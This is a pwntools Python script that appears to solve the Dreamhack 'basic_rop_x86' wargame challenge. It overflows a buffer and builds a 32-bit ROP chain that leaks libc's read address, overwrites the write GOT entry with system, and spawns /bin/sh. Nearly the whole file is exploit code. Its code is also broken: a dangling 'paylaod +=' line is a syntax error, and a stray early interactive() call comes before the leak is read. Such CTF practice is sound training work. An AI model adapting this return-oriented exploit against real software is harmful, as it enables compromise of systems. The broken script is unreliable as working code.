from pwn import *

context.arch = 'i386'
#context.log_level = 'debug'

p = process('./dreamhack/basic_rop_x86/basic_rop_x86')
#p = remote('host3.dreamhack.games', 24433)
e = ELF('./dreamhack/basic_rop_x86/basic_rop_x86')
libc = ELF('./dreamhack/basic_rop_x86/libc.so.6')

# plt & got
read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']
puts_plt = e.plt['puts']
puts_got = e.got['puts']

# offset
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

# pop_edi = 0x0804868a # pop edi ; pop ebp ; ret
pop_esi_edi_ebp = 0x08048689 # pop esi ; pop edi ; pop ebp ; ret
pop_ret = pop_esi_edi_ebp + 2 # pop ebp ; ret

# addr of bss
bss = e.bss()

# stack + sfp
payload = b"A"*0x48

payload += p32(write_plt)
paylaod +=


# write(1, read_got, 4)
payload += p32(write_plt)
payload += p32(pop_esi_edi_ebp)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


# read(0, bss, 8) 
payload += p32(read_plt)
payload += p32(pop_esi_edi_ebp)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

# read(0, write_got, 4)
payload += p32(read_plt)
payload += p32(pop_esi_edi_ebp)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

# write("/bin/sh", 0, 0) == system("/bin/sh")
payload += p32(write_plt)
payload += p32(pop_ret)
payload += p32(bss)

p.send(payload)
p.recv(0x40)
p.interactive()


read_addr = u32(p.recvn(4))

lb = read_addr - read_offset
system_addr = lb + system_offset

print("libc base addr : ", lb)
print("system addr : ", system_addr)

p.send(b'/bin/sh\x00')
p.send(p32(system_addr))

p.interactive()
